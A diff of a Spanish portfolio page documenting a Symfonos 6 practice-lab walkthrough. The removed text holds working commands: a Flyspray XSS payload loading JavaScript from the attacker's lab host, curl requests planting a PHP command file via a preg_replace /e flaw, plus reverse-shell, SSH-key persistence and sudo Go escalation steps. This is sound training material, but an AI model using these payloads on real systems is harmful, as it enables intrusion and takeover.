@@ -1,117 +1,34 @@
-<!doctype html><html lang="es"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="description" content="Portfolio de Daniel Escolar: ciberseguridad junior, SOC, Blue Team y laboratorios documentados."><title>Symfono Hack4u · Daniel Escolar</title><link rel="stylesheet" href="styles.css"></head><body><a class="skip" href="#contenido">Saltar al contenido</a><header class="nav"><div class="wrap"><a class="brand" href="index.html">DE<b>.</b></a><nav aria-label="Navegación principal"><a href="index.html#perfil">Perfil</a><a href="index.html#laboratorios">Laboratorios</a><a href="index.html#contacto">Contacto ↗</a></nav></div></header><main id="contenido" class="article"><a class="muted" href="index.html#laboratorios">← Todos los laboratorios</a><p class="eyebrow">Laboratorio · Linux</p><h1>Symfono Hack4u</h1><p class="lead">Laboratorio guiado con aplicación web, API y escalada mediante Go con sudo.</p><p class="tag">Web · API · Go</p><div class="intro"><h2 style="margin-top:0">Resultado documentado</h2><p>El cierre documenta Bash privilegiada y confirma la escalada.</p></div><details open><summary>Apuntes de la resolución</summary><p class="notice">Texto adaptado desde mis apuntes de laboratorio. Las capturas no se incluyen en esta edición; algunos pasos remiten a ellas. El cierre se ha seleccionado por lo descrito en el texto, sin repetir técnicamente la explotación.</p><h2>Symfono Hack4u</h2>
-<h2>Descubriendo la IP en la red local</h2>
-<p>Con el comando <code>arp-scan -I ens33 -localnet -ingnoredups</code> descubrimos la ip de nuestra máquina victima: <code>192.168.1.37</code>.</p>
-<h2>Escaneo con nmap</h2>
-<p>Al escanear con nmap para llevar a cabo un descubrimiento de puertos con el comando <code>nmap -p- --open --min-rate 5000 -vvv -n -Pn 192.168.1.49 -oG allports</code> descubrimos los puertos:</p>
-<pre><code>22(ssh)
-80(http)
-3000(http)
-3306(mariaDB)
-5000(http)</code></pre>
-<p>Después hacemos un escaneo más extenso con el siguiente comando:</p>
-<p><code>nmap -sCV -p80,22,3000,3306,5000 192.168.1.49 -oN targeted</code></p>
-<p>Utilizamos el script de nmap para enumerar el puerto 80: <code>nmap --script http-enum -p80 192.168.1.49 -oN webscan</code> pero solo vemos que hay un directorio <code>/icons</code>. Nada interesante.</p>
-<p>Como no vemos nada acudimos a la página web y no vemos absolutamente nada, solo una imágen. </p>
-<p>Si revisamos el código fuente podemos ver que nos da una pista de que no hay nada de la intrusión que ver con la fotografía, por lo tanto vamos a enumerar con <code>gobuster</code> el puerto 80 en busca de más directorios con el siguiente comando:</p>
-<p><code>gobuster dir -u http://192.168.1.49 -u /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</code></p>
-<p>Y podemos ver que solo nos descubre el directorio <code>/posts</code>:</p>
-<p>Accediendo al sitio web podemos ver lo siguiente:</p>
-<p>Se nos nombra a Achilles. Como pudimos ver al hacer el escaneo con nmap, el servicio <code>ssh</code> se encuentra en la version <code>7.4</code> por lo que es vulnerable a <code>username enumeration</code>. </p>
-<p>Vamos a ver si <code>Achilles</code> es un usuario. Con el siguiente script en python extraído de searchsploit sabremos si achilles es un posible usuario.</p>
-<p>Podemos ver lo siguiente al utilizar un script en python2.7 de <code>searchsploit</code>:</p>
-<p>Antes de seguir vamos a examinar el resto de puertos con http.</p>
-<p>En  nuestra dirección ip pero en el puerto <code>3000</code> podemos ver lo siguiente:</p>
-<p>Es un software que nos ayuda con repositorios git en formato web.</p>
-<p>Si revisamos el puerto <code>5000</code> podemos ver lo siguiente:</p>
-<p>De momento no nos sirve. A continuación vamos a seguir fuzzeando con GoBuster pero con el diccionario <code>big</code> para por si a caso se quedó algo sin descubrir.</p>
-<p>Al terminar el fuzzeo con gobuster podemos ver que existe otra ruta que es <code>/flyspry</code>.</p>
-<p>Nos vamos a dentro y vemos lo siguiente:</p>
-<p>Básicamente <code>flyspray</code> es un debbuger liviano montado en php, por lo que esto nos da pistas.</p>
-<p>Si buscamos en <code>searchsploit</code> esta vulnerabilidad podemos ver lo siguiente:</p>
-<p>Ahora debemos de buscar cual es la versión de este software que está instalado.</p>
-<p>Buscando por Google, me dirigí a el Github de este software. En docs pude ver que había un fichero <code>upgrading.txt</code> en el cual ponía que la última versión era de <code>0.9.9 a 1.0</code> por lo que si es así, estamos ante un posible <code>xss</code> junto con un <code>csrf</code>.</p>
-<h2>Ejecutando el XSS junto con el CSRF</h2>
-<p>Leyendo el script de <code>searchsploit</code> sobre la vulnerabilidad, nos comentan que hay un campo <code>real name</code> que no esta correctamente sanitizado, pero que además, este campo es vulnerable a un <code>xss</code> cuando en la url conste como que estamos en la siguiente dirección: <code>?do=myprofile</code>.</p>
-<p>Nos damos cuenta que al registrarnos existe este campo <code>real name</code> pero no aparece en la url lo que necesitamos, por lo que se intuye que debemos estar registrados.</p>
-<p>Al registrarnos e irnos a nuestro perfil, modificamos el campo <code>real name</code> con el siguiente comando: <code>&lt;script&gt;alert(&quot;hola&quot;)&lt;/script&gt;</code> para ver si es susceptible al xss como nos comenta el script.</p>
-<p>Vemos que no hace nada, así que vamos al vídeo de YouTube que nos enlaza el creador de este script y nos damos cuenta que el utiliza, antes del script, lo siguiente: <code>&quot;&gt;</code>.</p>
-<p>Volvemos a nuestro campo <code>real name</code> e introducimos lo que nos quedaba y nos damos cuenta que ahora, al recargar la página, funciona el <code>alert</code>.</p>
-<p>Ahora lo único que nos falta es encontrar el campo donde acontecer el <code>csrf</code>. Buscando por la página podemos ver el apartado <code>tasklist</code> </p>
-<p>Si pinchamos en ella podemos ver que hay reporte de <code>bugs</code>, si pinchamos en ella podemos ver que hay comentario del administrador diciéndonos que va a estar constantemente leyendo esta sección para solucionar posibles <code>bugs</code> por lo que ya hemos encontrado el vector de ataque.</p>
-<p>Si escribimos un comentario con nuestro nombre en <code>&quot;&gt;&lt;scrip&gt;alert(&quot;hola&quot;)&lt;/script&gt;</code> podemos ver que al recargar en la página, se sigue aconteciendo el <code>xss</code> por lo que podemos hacer es, en el campo <code>real name</code> sería hacer que el administrador , mediante un script externo, nos cree un usuario administrador.</p>
-<p>En el script de <code>searchsploit</code> nos comparte un script escrito en <code>js</code> para acontecer esta vulnerabilidad.</p>
-<p>Nos creamos en nuestro directorio un archivo, por ejemplo, <code>pwnd.js</code> en el cual está el código malicioso.</p>
-<p>En el campo <code>real name</code> introducimos lo siguiente: <code>&quot;&gt;&lt;script src=&quot;http://192.168.1.150/pwnd.js&quot;&gt;&lt;/script&gt;</code> mientras que en nuestro directorio con el <code>script</code> nos compartiremos un servidor python.</p>
-<p>Una vez realizado todo esto podemos ver como recibimos peticiones del admin, vamos a ver si nos ha creado exitosamente el usuario.</p>
-<p>Efectivamente se creó con éxito el usuario y ahora somos admin:</p>
-<p>Si nos volvemos  a la pestaña <code>tasklists</code> podemos ver algo que antes no:</p>
-<p>Dentro de este hilo abierto podemos ver lo siguiente:</p>
-<p>Tenemos credenciales válidas para git.</p>
-<h2>Credenciales válidas de Git</h2>
-<p>Según entramos al <code>Git</code> por el puerto <code>3000</code> podemos ver lo siguiente:</p>
-<p>Vamos a echarle un ojo primero a <code>synfonos-blog</code> y podemos ver lo siguiente:</p>
-<p>Vamos a echarle un ojo a <code>index.php</code> y podemos ver que es el recurso principal de lo que vimos en <code>http://192.168.1.49/posts/</code> </p>
-<p>En la página web, como el código php se interpretaba no podíamos ver lo siguiente:</p>
-<p>Como podemos ver en esta función de php, está iterando con <code>mysqli_fetch_assoc</code> en <code>$content</code>.</p>
-<p>Luego lo muestra por la web y posteriormente utiliza la función <code>preg_replace</code> para generar una sustitución. Podemos ver que está empleando un modificador <code>/e</code> que si lo buscamos en Google, nos avisa de que se puede inyectar código php después de este modificador.</p>
-<p>Como por ahora no tenemos como inyectar este código seguimos buscando como hacerlo.</p>
-<p>En la ruta <code>includes/dbconfig.php</code> podemos ver credenciales</p>
-<p>Vamos a intentar con esas credenciales conectarnos a la base de datos:</p>
-<p>No se nos permite desde nuestra ip conectarnos, por lo que de momento nada, por lo que seguimos buscando.</p>
-<p>Ahora vamos a echarle un ojo al otro directorio de git de la api.</p>
-<h2>Symfonos api</h2>
-<p>Nada más entrar al repositorio podemos ver un <code>.env</code> con el puerto designado en <code>5000</code> por lo que podemos confirmar que lo que veíamos en la ruta de la web es, efectivamente la api.</p>
-<p>Ahora vamos a echarle un ojo a los <code>endpoints</code> de la api.</p>
-<p>Entrando a la carpeta <code>api</code> vemos un archivo <code>api.go</code>.</p>
-<p>En <code>api.go</code> podemos ver lo siguiente:</p>
-<p>Parece que tenemos una ruta <code>/ls2o4g</code>, vamos a probarla en navegador.</p>
-<p>Nos pone <code>page not found</code> así que seguimos buscando.</p>
-<p>Si seguimos buscando vemos una carpeta con versión <code>1.0</code> y vemos otro archivo <code>.go</code> por lo que le echamos un vistazo y vemos que hay otra ruta para la api:</p>
-<p>Podemos ver que mediante el método <code>GET</code> podemos lanzar un <code>/ping</code> y recibiremos un <code>pong</code>. Si esto funciona pude tener muy buena pinta.</p>
-<p>Y como podemos ver, funciona:</p>
-<p>Vamos a seguir echándole un ojo a ver que encontramos.</p>
-<p>Vemos un archivo <code>auth</code> con otro archivo <code>auth.go</code> en su interior y vemos lo siguiente:</p>
-<p>Básicamente, mediante el método <code>post</code> podemos loggearnos a la api.</p>
-<p>Si le echamos un ojo al otro archivo que estaba en la carpeta <code>auth.ctrl.go</code> podemos ver lo siguiente:</p>
-<p>Para loggearnos nos pide , en formato json, username y password.</p>
-<p>Como podemos ver:</p>
-<p>Hemos echo el siguiente curl:</p>
-<pre><code>curl -s -X POST &quot;http://192.168.1.49/ls2og4/v1.0/auth/login&quot; -H &quot;Content-type: application/json&quot; -d &#x27;{&quot;username&quot;:&quot;achilles&quot;,&quot;password&quot;:&quot;contraseña&quot;}&#x27;</code></pre>
-<p>Arrastramos el <code>header</code> con formato <code>json</code> porque podría no interpretarse cuando mandásemos la data.</p>
-<p>Y podemos ver que nos responde con un <code>json web token</code>.</p>
-<p>Sabemos, después de obtener este <code>json web token</code> que tenemos la ruta <code>/posts</code> la cual da a la web.</p>
-<p>Vamos a echarle un ojo a <code>posts.go</code> y vemos lo siguiente:</p>
-<p>Podemos ver que si realizamos una petición a <code>/posts/</code> vemos lo siguiente:</p>
-<p>Efectivamente nos lista el texto que vemos por la web.</p>
-<p>Vemos el campo <code>text</code> y el campo <code>id</code>.</p>
-<p>Vamos a tratar de modificar el texto mediante la función <code>PATCH</code> a ver si podemos hacerlo.</p>
-<p>Y efectivamente con el comando: </p>
-<p><code>curl -s -X PATCH &quot;http://192.168.1.49:5000/ls2o4g/v1.0/posts/1&quot; -H &quot;Content-type: application/json&quot; -b &#x27;token={token}&#x27; -d &#x27;{&quot;text&quot;:&quot;probando&quot;}&#x27;</code> </p>
-<p>Hemos conseguido cambiar el texto a probando:</p>
-<p>Por lo que en este punto podemos abusar del <code>preg_replace</code> que está por detrás.</p>
-<p>En este punto ya podríamos conseguir una <code>reverse shell</code>. El único inconveniente es que en este punto usando <code>curl</code> podríamos tener bastantes problemas usando el one liner típico.</p>
-<p>Por lo que vamos a utilizar una función propia de php para hacer la reverse shell más fácil.</p>
-<p>Con el siguiente comando:</p>
-<pre><code>curl -s -X PATCH &quot;http://192.168.1.49:5000/ls2o4g/v1.0/posts/1&quot; -H &quot;Content-type: application/json&quot; -b &#x27;token={cookie}&#x27; -d $&#x27;{&quot;text&quot;:&quot;file_put_content(\&#x27;cmd.php\&#x27;,base64_decode(\&#x27;{cadena codificada en base64}\&#x27;))&quot;}&#x27;</code></pre>
-<p>Con esto conseguimos crear una dirección a la cual podemos acceder mediante navegador donde se nos va a interpretar nuestro código php:</p>
-<p>Ahora tenemos un <code>RCE</code>. Ahora nos mandaremos una bash con el one liner típico.</p>
-<p>Ahora hacemos un tratamiento de la tty para poder operar mejor y ya hemos comprometido la máquina.</p>
-<h2>Escalada de privilegios</h2>
-<p>Una vez dentro miro con el comando <code>ls -l /home/</code> a ver que usuarios hay y veo que está el usuario <code>achilles</code>. Vamos a tratar de migrar al usuario <code>achilles</code> con las credenciales que habíamos descubierto.</p>
-<p>Y podemos ver que ahora somos el usuario <code>achilles</code>.</p>
-<p>Para generar persistencia y podernos conectarnos por <code>ssh</code> nos vamos al <code>home</code> de achilles y vamos a modificar las claves de ssh.</p>
-<p>Con <code>ssh-keygen</code> creamos un par de claves y la clave pública es la que vamos a copiar dentro de la máquina víctima.</p>
-<p>Una vez hecho esto cambiamos los permisos de las <code>authorized_keys</code> a <code>600</code> para que funcione correctamente y ya podremos conectarnos como achilles directamente por ssh:</p>
-<p>Habiendo exportado <code>TERM=xterm</code> ya tenemos todo lo necesario para escalar privilegios.</p>
-<h2>Escalada de privilegios.</h2>
-<p>Siendo el usuario achilles ejecutamos el comando <code>sudo -l</code> para ver si podemos ejecutar algo de manera privilegiada y vemos lo siguiente:</p>
-<p>Podemos ejecutar la ruta absoluta de <code>go</code> de manera privilegiada.</p>
-<p>Si hacemos un <code>go --help</code> podemos ver lo siguiente:</p>
-<p>Con el atributo <code>run</code> podemos ejecutar un script en go.</p>
-<p>Vamos a buscar en google a ver si encontramos un script que no ejecute una shell privilegiada.</p>
-<p>Encontramos lo siguiente, un script que nos permite ejecutar comandos con go, por lo que tenemos una vía potencial de ejecutar comandos de manera privilegiada.</p>
-<p>Encontramos en google una manera de ejecutar comandos con go, en un script. Lo único que debemos hacer es irnos a una ruta donde tengamos capacidad de escritura, en este caso yo me fuí a <code>/tmp</code> y cree el script y luego lo ejecuté con el comando: <code> sudo {rutadel programa de go} run {script}.</code></p>
-<p>Dentro del script, conseguíamos que <code>bash</code> tuviese permisos <code>suid</code> para poder ejecutarnos una bash privilegiada.</p>
-<p>Tras ejecutar , simplemente ponemos el siguiente comando:</p>
-<p><code>bash -p</code> y vemos lo siguiente:</p>
-<p>Ya hemos conseguido la escalada de privilegios.</p></details><div class="actions"><a class="button" href="index.html#laboratorios">← Volver al catálogo</a></div></main><footer><div class="wrap">Daniel Escolar · Ciberseguridad y desarrollo · Laboratorios realizados en entornos de práctica.</div></footer></body></html>
+<!doctype html><html lang="es"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="description" content="Symfonos 6 · Hack4u — Laboratorios de ciberseguridad de Daniel Escolar."><title>Symfonos 6 · Hack4u · Daniel Escolar</title><link rel="stylesheet" href="styles.css"></head><body><a class="skip" href="#contenido">Saltar al contenido</a><header class="nav"><div class="wrap"><a class="brand" href="index.html">DE<b>.</b></a><nav aria-label="Navegación principal"><a href="index.html#perfil">Perfil</a><a href="index.html#laboratorios">Laboratorios</a><a href="index.html#contacto">Contacto ↗</a></nav></div></header><main id="contenido" class="article"><a class="muted" href="index.html#laboratorios">← Todos los laboratorios</a><p class="eyebrow">Linux · Laboratorio</p><h1>Symfonos 6 · Hack4u</h1><p class="lead">Laboratorio guiado con aplicación web, API y escalada mediante Go con sudo.</p><p class="tag">Web · API · Go</p><h2>Enumerando los servicios</h2>
+<p>En este laboratorio del curso de Hack4u encontramos SSH, MariaDB y servicios HTTP en los puertos <code>80</code>, <code>3000</code> y <code>5000</code>. La web principal no da mucha información, así que enumeramos rutas hasta llegar a <code>/posts</code>. En el contenido aparece <code>achilles</code>, que comprobamos como posible usuario. También revisamos el servicio Git del puerto <code>3000</code> y la aplicación del <code>5000</code>, aunque todavía no podemos aprovecharlos.</p>
+<h2>XSS en Flyspray</h2>
+<p>Cambiando el diccionario de enumeración encontramos Flyspray. Buscamos información sobre la versión y localizamos un problema en el campo <code>real name</code>. El primer <code>alert</code> no funciona. Revisando la prueba de concepto veo que hay que cerrar primero el contexto HTML con <code>&quot;&gt;</code>. Repetimos la prueba y esta vez se ejecuta el JavaScript.</p>
+<figure><a href="shot-symfono-hack4u-06.webp" target="_blank" rel="noopener" aria-label="Ampliar captura: XSS en Flyspray"><img src="shot-symfono-hack4u-06.webp" alt="Symfono Hack4u: xss en flyspray, captura 6" width="1921" height="681" loading="lazy" decoding="async"></a></figure>
+<figure><a href="shot-symfono-hack4u-07.webp" target="_blank" rel="noopener" aria-label="Ampliar captura: XSS en Flyspray"><img src="shot-symfono-hack4u-07.webp" alt="Symfono Hack4u: xss en flyspray, captura 7" width="975" height="288" loading="lazy" decoding="async"></a></figure>
+<p>En una tarea aparece un comentario del administrador indicando que revisa los reportes. Aprovechamos ese recorrido para cargar un JavaScript desde nuestro equipo y hacer que su sesión cree un usuario administrador. Comprobamos que el usuario se ha creado y entramos. Ahora podemos leer un hilo que antes no veíamos; contiene las credenciales de Git.</p>
+<figure><a href="shot-symfono-hack4u-09.webp" target="_blank" rel="noopener" aria-label="Ampliar captura: XSS en Flyspray"><img src="shot-symfono-hack4u-09.webp" alt="Symfono Hack4u: xss en flyspray, captura 9" width="457" height="311" loading="lazy" decoding="async"></a></figure>
+<figure><a href="shot-symfono-hack4u-10.webp" target="_blank" rel="noopener" aria-label="Ampliar captura: XSS en Flyspray"><img src="shot-symfono-hack4u-10.webp" alt="Symfono Hack4u: xss en flyspray, captura 10" width="677" height="123" loading="lazy" decoding="async"></a></figure>
+<figure><a href="shot-symfono-hack4u-11.webp" target="_blank" rel="noopener" aria-label="Ampliar captura: XSS en Flyspray"><img src="shot-symfono-hack4u-11.webp" alt="Symfono Hack4u: xss en flyspray, captura 11" width="409" height="197" loading="lazy" decoding="async"></a></figure>
+<h2>Revisando el código del blog</h2>
+<p>Con acceso a los repositorios empezamos por el blog. En <code>index.php</code> encontramos un <code>preg_replace</code> con el modificador <code>/e</code>, que evalúa el resultado de la sustitución como PHP. La pregunta ahora es cómo controlar el texto que llega hasta ahí.</p>
+<figure><a href="shot-symfono-hack4u-14.webp" target="_blank" rel="noopener" aria-label="Ampliar captura: Revisando el código del blog"><img src="shot-symfono-hack4u-14.webp" alt="Symfono Hack4u: revisando el código del blog, captura 14" width="550" height="218" loading="lazy" decoding="async"></a></figure>
+<p>También aparecen credenciales de MariaDB, pero el servidor no acepta nuestra conexión remota. Seguimos con el repositorio de la API.</p>
+<h2>La API como puente</h2>
+<p>Leyendo el código Go reconstruimos las rutas y comprobamos primero el endpoint <code>/ping</code>. Después revisamos la autenticación: espera usuario y contraseña en JSON y devuelve un token.</p>
+<figure><a href="shot-symfono-hack4u-19.webp" target="_blank" rel="noopener" aria-label="Ampliar captura: La API como puente"><img src="shot-symfono-hack4u-19.webp" alt="Symfono Hack4u: la api como puente, captura 19" width="821" height="214" loading="lazy" decoding="async"></a></figure>
+<figure><a href="shot-symfono-hack4u-20.webp" target="_blank" rel="noopener" aria-label="Ampliar captura: La API como puente"><img src="shot-symfono-hack4u-20.webp" alt="Symfono Hack4u: la api como puente, captura 20" width="430" height="323" loading="lazy" decoding="async"></a></figure>
+<figure><a href="shot-symfono-hack4u-21.webp" target="_blank" rel="noopener" aria-label="Ampliar captura: La API como puente"><img src="shot-symfono-hack4u-21.webp" alt="Symfono Hack4u: la api como puente, captura 21" width="679" height="144" loading="lazy" decoding="async"></a></figure>
+<figure><a href="shot-symfono-hack4u-22.webp" target="_blank" rel="noopener" aria-label="Ampliar captura: La API como puente"><img src="shot-symfono-hack4u-22.webp" alt="Symfono Hack4u: la api como puente, captura 22" width="1846" height="87" loading="lazy" decoding="async"></a></figure>
+<p>Con ese token podemos consultar <code>/posts</code> y modificar el campo <code>text</code> mediante <code>PATCH</code>. Hacemos primero una prueba con un texto sencillo y comprobamos el cambio en la web.</p>
+<figure><a href="shot-symfono-hack4u-26.webp" target="_blank" rel="noopener" aria-label="Ampliar captura: La API como puente"><img src="shot-symfono-hack4u-26.webp" alt="Symfono Hack4u: la api como puente, captura 26" width="918" height="251" loading="lazy" decoding="async"></a></figure>
+<p>Ya podemos unir las dos piezas: la API escribe el contenido y el blog lo procesa con el <code>preg_replace</code> vulnerable. Preparamos el PHP para crear un archivo desde el que ejecutar comandos y, después, nos mandamos una reverse shell.</p>
+<figure><a href="shot-symfono-hack4u-27.webp" target="_blank" rel="noopener" aria-label="Ampliar captura: La API como puente"><img src="shot-symfono-hack4u-27.webp" alt="Symfono Hack4u: la api como puente, captura 27" width="813" height="182" loading="lazy" decoding="async"></a></figure>
+<figure><a href="shot-symfono-hack4u-28.webp" target="_blank" rel="noopener" aria-label="Ampliar captura: La API como puente"><img src="shot-symfono-hack4u-28.webp" alt="Symfono Hack4u: la api como puente, captura 28" width="915" height="268" loading="lazy" decoding="async"></a></figure>
+<h2>Acceso como achilles</h2>
+<p>Dentro del sistema probamos las credenciales que ya teníamos y podemos cambiar al usuario <code>achilles</code>. Para trabajar por SSH generamos un par de claves y añadimos la pública a <code>authorized_keys</code>, con los permisos correspondientes.</p>
+<figure><a href="shot-symfono-hack4u-29.webp" target="_blank" rel="noopener" aria-label="Ampliar captura: Acceso como achilles"><img src="shot-symfono-hack4u-29.webp" alt="Symfono Hack4u: acceso como achilles, captura 29" width="404" height="85" loading="lazy" decoding="async"></a></figure>
+<h2>Go con sudo</h2>
+<p>Revisamos <code>sudo -l</code> y vemos que podemos ejecutar Go como root. Con <code>go run</code> podemos lanzar nuestro propio programa, así que lo preparamos en <code>/tmp</code> para dar a Bash el permiso SUID.</p>
+<figure><a href="shot-symfono-hack4u-30.webp" target="_blank" rel="noopener" aria-label="Ampliar captura: Go con sudo"><img src="shot-symfono-hack4u-30.webp" alt="Symfono Hack4u: go con sudo, captura 30" width="1816" height="247" loading="lazy" decoding="async"></a></figure>
+<p>Ejecutamos el programa mediante sudo y después abrimos Bash con <code>bash -p</code>.</p>
+<figure><a href="shot-symfono-hack4u-33.webp" target="_blank" rel="noopener" aria-label="Ampliar captura: Go con sudo"><img src="shot-symfono-hack4u-33.webp" alt="Symfono Hack4u: go con sudo, captura 33" width="420" height="216" loading="lazy" decoding="async"></a></figure>
+<p>Ya tenemos una shell privilegiada.</p><div class="actions"><a class="button" href="index.html#laboratorios">← Volver a los laboratorios</a></div></main><footer><div class="wrap">Daniel Escolar · Ciberseguridad y desarrollo</div></footer></body></html>
